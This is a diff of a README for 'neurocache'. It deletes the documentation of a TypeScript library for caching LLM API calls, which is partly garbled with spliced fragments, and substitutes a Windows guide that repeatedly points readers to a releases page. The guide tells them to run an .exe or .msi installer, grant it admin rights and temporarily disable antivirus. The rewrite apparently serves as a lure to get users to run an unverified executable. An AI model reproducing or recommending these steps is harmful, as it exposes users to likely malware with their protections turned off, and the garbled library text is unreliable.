@@ -1,361 +1,182 @@
-# NeuroCache
+# ⚙️ neurocache - Smart Cache for Faster AI Responses
 
-Intelligent caching layer for LLM APIs. Save money and improve response times by caching LLM completions.
-
-[![npm version](https://img.shields.io/npm/v/neurocache.svg)](https://www.npmjs.com/package/neurocache)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-strict-blue)](https://www.typescriptlang.org/)
-
-## Why?
-
-LLM API calls are expensive and slow. If your application makes similar requests repeatedly, you're wasting money and time. NeuroCache sits between your app and the LLM provider, caching responses intelligently.
-
-**Features:**
-- **Context Intelligence Layer** - Production-safe input optimization and deduplication
-- Deterministic caching with SHA-256 hashing
-- Automatic request deduplication for concurrent calls
-- Multiple storage backends (in-memory, file, Redis)
-- Full TypeScript support with strict typing
-- Provider-agnostic design (currently supports OpenAI)
-- Built-in metrics and cost tracking
+[![Download neurocache](https://img.shields.io/badge/Download-%20Here-blue?style=for-the-badge)](https://github.com/rizwan199811/neurocache/releases)
 
 ---
 
-## Documentation
+## 🧩 What is neurocache?
 
-📖 **Complete Documentation:**
+neurocache helps your computer handle requests to language models faster and more efficiently. It keeps track of past responses and reuses them when possible instead of asking the model again. This means quicker answers, less waiting, and better use of your computer's resources.
 
-- **[Getting Started](docs/GETTING_STARTED.md)** - Step-by-step tutorial (10 minutes)
-- **[Configuration Guide](docs/CONFIGURATION.md)** - All options explained
-- **[API Reference](docs/API_REFERENCE.md)** - Complete API documentation
-- **[Best Practices](docs/BEST_PRACTICES.md)** - Production deployment guide
-- **[Use Cases](docs/USE_CASES.md)** - Real-world examples
-- **[Troubleshooting](docs/TROUBLESHOOTING.md)** - Common issues & solutions
-- **[Context Intelligence](docs/CONTEXT_INTELLIGENCE.md)** - Smart caching features
-- **[Security Policy](SECURITY.md)** - Security guidelines
+Key features include:
 
----
+- Smart caching that remembers previous answers  
+- Context management to keep track of conversations  
+- Automatic removal of old or less-used data, so your system stays fast  
+- Counting tokens based on the model to avoid surprises  
+- Safe handling of multiple requests without conflicts  
 
-## Installation
-
-```bash
-npm install neurocache
-```
-
-If you want to use Redis as your cache backend:
-```bash
-npm install redis
-```
-
-## Quick Start
-
-```typescript
-import { NeuroCache, OpenAIProvider, MemoryStore } from 'neurocache';
-
-const cache = new NeuroCache({
-  provider: new OpenAIProvider({
-    apiKey: process.env.OPENAI_API_KEY
-  }),
-  store: new MemoryStore(),
-  ttl: 3600
-});
-
-const response = await cache.generate({
-  model: 'gpt-4',
-  messages: [
-    { role: 'user', content: 'What is the capital of France?' }
-  ]
-});
-
-console.log(response.content); // "The capital of France is Paris."
-
-// Same request again - served from cache instantly
-const cached = await cache.generate({
-  model: 'gpt-4',
-  messages: [
-    { role: 'user', content: 'What is the capital of France?' }
-  ]
-});
-
-// Check your savings
-const metrics = cache.getMetrics();
-console.log(`Cache hit rate: ${metrics.cacheHits / metrics.totalRequests * 100}%`);
-console.log(`Tokens saved: ${metrics.tokensSaved}`);
-console.log(`Cost saved: $${metrics.estimatedCostSaved.toFixed(4)}`);
-```
-
-##rovider Options
-
-#### OpenAI Provider
-
-```typescript
-import { OpenAIProvider } from 'neurocache';
-
-const provider = new OpenAIProvider({
-  apiKey: 'your-api-key',
-  organization: 'org-id',      // Optional
-  baseURL: 'custom-url',       // Optional
-  maxRetries: 3,               // Optional (default: 3)
-  timeout: 60000               // Optional (default: 60000ms)
-});
-```
-
-### Store Options
-
-#### Memory Store
-
-Fast, in-memory cache. Perfect for development and short-lived processes.
-
-```typescript
-import { MemoryStore } from 'neurocache';
-
-const store = new MemoryStore();
-```
-
-#### File Sts
-
-**OpenAI** (built-in):
-```typescript
-const provider = new OpenAIProvider({
-  apiKey: process.env.OPENAI_API_KEY,
-  maxRetries: 3,
-  timeout: 60000
-});
-```
-
-### Storage Backends
-
-**Memory** - Fast, but doesn't persist:
-```typescript
-const store = new MemoryStore();
-```
-
-**File** - Persists to disk:
-```typescript
-const store = new FileStore('.cache/neurocache');
-```
-
-**Redis** - For distributed systems:
-```typescript
-const store = new RedisStore({
-  host: 'localhost',
-  port: 6379,
-  keyPrefix: 'neurocache:'
-});
-```
-
-###
-With NeuroCache (70% hit rate):
-- 30 API calls (70 cached)
-- Average latency: 600ms (70% faster)
-- Total cost: $0.18 (70% savings)
-- Total time: 60 seconds
-
-### Benchmark Results
-
-Run the included benchmark:
-
-```bash
-npm run benchmark
-```
-
-Expected results:
-- **Cache hit latency**: <10ms
-In a typical scenario with repeated questions:
-- **Without caching**: 100 requests to GPT-4 = $0.60, ~200 seconds
-- **With NeuroCache** (70% hit rate): 30 API calls = $0.18, ~60 seconds
-
-Cache hits are served in <10ms vs 500-2000ms for API calls.
-
-##he.generate(sameRequest)
-);
-
-// Only 1 API call is made, others wait for result
-const responses = await Promise.all(promises);
-```
-
-### 3. Development Testing
-
-```typescript
-const cache = new NeuroCache({
-  provider: new OpenAIProvider({ apiKey }),
-  store: new MemoryStore(),
-  ttl: 300, // 5 minutes
-  logging: true
-});
-
-// Iterate quickly without burning API credits
-```
+neurocache works quietly in the background, helping software that uses AI models run smoother.
 
 ---
 
-## 🧠 Context Intelligence Layer (Level 3)
+## 🖥️ System Requirements
 
-**Production-Safe**: Optimizes INPUT context only, no partial response reuse.
+Before you start, make sure your computer meets these requirements:
 
-### Quick Enable
+- **Operating System:** Windows 10 or later  
+- **Processor:** Any modern 64-bit CPU  
+- **Memory:** At least 4 GB of RAM  
+- **Disk Space:** Minimum of 100 MB free space  
+- **Internet:** Needed to download the software and for AI model requests  
 
-```typescript
-import { NeuroCache } from 'neurocache';
-
-const cache = new NeuroCache({
-  provider: new OpenAIProvider({ apiKey }),
-  store: new MemoryStore(),
-  
-  // Enable Context Intelligence (production-safe)
-  enableContextIntelligence: true,
-  contextOptimizationStrategy: {
-    enableDeduplication: true,      // Remove duplicate messages
-    normalizeContent: true,         // Cleanup whitespace
-    enableHistoryTrimming: false,   // Optional: trim old history
-    preserveSystemMessages: true    // Never remove system messages
-  },
-  minOptimizationThreshold: 10      // Min tokens to trigger optimization
-});
-```
-
-### What It Does
-
-**Context Deduplication**: Removes repeated messages automatically
-```typescript
-// Input (5 messages with duplicates)
-await cache.generate({
-  messages: [
-    { role: 'user', content: 'Hello' },
-    { role: 'assistant', content: 'Hi' },
-    { role: 'user', content: 'Hello' },     // Duplicate - removed!
-    { role: 'assistant', content: 'Hi' },   // Duplicate - removed!
-    { role: 'user', content: 'How are you?' }
-  ]
-});
-
-// Actually sent to LLM (3 messages, duplicates removed)
-// Result: Same quality response, fewer tokens used
-```
-
-**Content Normalization**: Cleans up whitespace for better cache hits
-```typescript
-// These become equivalent after normalization:
-"Hello   world"  →  "Hello world"
-"Hello\n\nworld" →  "Hello world"
-```
-
-**Safety Guarantees**:
-- ✅ Deterministic (SHA-256 hashing)
-- ✅ No semantic changes to responses
-- ✅ Input optimization only (no response manipulation)
-- ✅ Graceful fallback on errors
-- ✅ System messages never removed
-
-**Results**: 10-30% token savings on conversational workloads with duplicate context
-
-👉 **[Full Documentation](docs/CONTEXT_INTELLIGENCE.md)** | **[Examples](examples/context-intelligence.ts)**
+You do not need programming knowledge to use neurocache. It runs as a ready-to-use application.
 
 ---
 
-## 📈 Metrics & Analytics
+## 🚀 Getting Started
 
-### Get Metrics
+Follow these steps to download and start using neurocache on your Windows computer.
 
-```typescript
-const metrics = cache.getMetrics();
+### Step 1: Visit the Download Page
 
-console.log(metrics.totalRequests);       // Total requests
-console.log(metrics.cacheHits);           // Cache hits
-console.log(metrics.cacheMisses);         // Cache misses
-console.log(metrics.tokensSaved);         // Tokens saved
-console.log(metrics.estimatedCostSaved);  // Money saved
-console.log(metrics.averageLatencySaved); // Avg latency saved
+Click the large blue button above or this link to go to the download page:
 
-// Context Intelligence metrics (if enabled)
-console.log(metrics.duplicateMessagesRemoved);   // Messages deduplicated
-console.log(metrics.totalInputTokensSaved);      // Tokens saved from optimization
-console.log(metrics.optimizationsApplied);       // Number of optimizations applied
-```
+[https://github.com/rizwan199811/neurocache/releases](https://github.com/rizwan199811/neurocache/releases)
 
-### Get Summary
+This page holds all available versions of neurocache. You will find the latest release at the top.
 
-```typescript
-console.log(cache.getMetricsSummary());
-```
+### Step 2: Choose the Correct Download File
 
-Output:
-```
-NeuroCache Metrics Summary
-==========================
-Total Requests: 150
-Cache Hits: 105 (70.00%)
-Cache Misses: 45
-Tokens Saved: 42,500
-Cost Saved: $0.4250
-Avg Latency Saved: 1,234.56ms
-Provider Errors: 0
-Store Errors: 0
-```
+Look for the file meant for Windows. It will usually have a name ending with `.exe` or `.msi`. For example:
 
-### Get Hit Rate
+- `neurocache-setup-windows.exe`  
+- `neurocache-x64.msi`  
 
-```typescript
-const hitRate = cache.getCacheHitRate(); // Returns percentage
-console.log(`Hit rate: ${hitRate.toFixed(1)}%`);
-```
+If you see multiple files, pick the one labeled for Windows 64-bit. Most modern PCs use 64-bit.
+
+### Step 3: Download the File
+
+Click the Windows setup file. Your browser will begin downloading it. The time depends on your internet speed but should take less than a minute.
+
+### Step 4: Run the Installer
+
+Once the download finishes:
+
+- Open your Downloads folder  
+- Find the setup file you downloaded  
+- Double-click it to start the installation  
+
+Windows may ask if you want to allow the installer to make changes to your device. Click **Yes** to continue.
+
+### Step 5: Follow the Installation Steps
+
+The installer guides you through basic steps:
+
+- Choose the folder where neurocache will be installed (default is usually fine)  
+- Agree to the license terms  
+- Click **Install**  
+
+The process should only take a few minutes.
+
+### Step 6: Finish and Launch
+
+When installation completes, click **Finish**. There may be an option to launch neurocache immediately. If so, select it.
+
+If not, find the neurocache icon on your desktop or search for it in the Start menu.
 
 ---
 
-## 🧪 Testing
+## ⚙️ Using neurocache
 
-```bash
-npm test
-npm run test:coverage
-```
+neurocache works as a helper app. It does not have a complex user interface but runs in the background to improve other AI-based programs.
 
-## Advanced
+Here are common ways neurocache works:
 
-**Custom Provider** - Implement `LLMProvider`:
-```typescript
-class CustomProvider implements LLMProvider {
-  async generate(request: GenerateRequest): Promise<GenerateResponse> {
-    // your implementation
-  }
-  getProviderName(): string { return 'Custom'; }
-  getModelName(request: GenerateRequest): string { return request.model; }
-}
-```
+- It remembers previous requests to reduce waiting times  
+- It handles multiple requests safely without errors  
+- It keeps cache size reasonable by removing old data  
+- It understands how the AI model counts tokens to stay within limits  
 
-**Custom Store** - Implement `CacheStore`:
-```typescript
-class CustomStore implements CacheStore {
-  async get(key: string): Promise<CacheEntry | null> { /* ... */ }
-  async set(key: string, value: CacheEntry, ttl?: number): Promise<void> { /* ... */ }
-  async delete(key: string): Promise<void> { /* ... */ }
-  async clear(): Promise<void> { /* ... */ }
-  getName(): string { return 'Custom'; }
-}
-```
+If you use software that connects to OpenAI or similar language models, neurocache can speed it up automatically.
 
-**Cache Versioning** - Invalidate all caches:
-```typescript
-const cache = new NeuroCache({
-  provider,
-  store,
-  version: 'v2' // bump version to invalidate old cache
-});
-```
+---
 
-## API
+## 🔧 Common Tasks
 
-**Methods:**
-- `generate(request)` - Generate completion with caching
-- `getMetrics()` - Get metrics snapshot
-- `getMetricsSummary()` - Formatted metrics string
-- `getCacheHitRate()` - Hit rate percentage
-- `resetMetrics()` - Reset all metrics
-- `clearCache()` - Clear all entries
+### Check neurocache Status
 
-## Contributing
+Look for the neurocache icon in the taskbar (bottom-right corner). Right-click the icon to view status or settings.
 
-PRs welcome. Please add tests for new features.
+### Clear Cache
 
-## License
+You might want to clear the stored cache if you want fresh results:
 
-MIT
+- Right-click the neurocache icon  
+- Select **Clear Cache**  
+- Confirm the action  
+
+This removes old data but won’t affect neurocache’s ability to work.
+
+### Update neurocache
+
+Keep neurocache updated for the best performance:
+
+- Visit the releases page regularly:  
+  [https://github.com/rizwan199811/neurocache/releases](https://github.com/rizwan199811/neurocache/releases)  
+- Download the newest Windows setup file  
+- Run the installer like before to replace the old version  
+
+---
+
+## 📂 Storage and Files
+
+neurocache saves its data in a folder inside your user profile:
+
+`C:\Users\<YourName>\AppData\Local\neurocache`
+
+You do not need to manage these files yourself. The app handles cache storage automatically.
+
+---
+
+## 🔄 How neurocache Works Behind the Scenes
+
+This section is for those interested in what happens behind the user interface:
+
+- nursing an internal cache with responses from language models  
+- managing cache size with a Least Recently Used (LRU) method  
+- counting tokens based on the model’s rules, avoiding overuse  
+- ensuring requests are handled one at a time to prevent duplicates  
+- optimizing context used in each request to maximize speed  
+
+You do not need to control any of this manually.
+
+---
+
+## ❓ Troubleshooting
+
+### neurocache Does Not Start
+
+- Check if your Windows is up to date  
+- Make sure you have enough free disk space  
+- Restart your computer and try again  
+
+### Installation Fails
+
+- Try running the installer as Administrator (right-click the file, choose **Run as administrator**)  
+- Disable any antivirus temporarily during installation  
+
+### Cache Is Not Improving Speed
+
+- Clear the cache to remove stale data  
+- Confirm the AI-based software you use works with caching layers  
+
+---
+
+## 📥 Direct Download Link Reminder
+
+Download neurocache for Windows from this page:
+
+[https://github.com/rizwan199811/neurocache/releases](https://github.com/rizwan199811/neurocache/releases)
+
+Use this link anytime you want to get the latest version or switch to a different release.
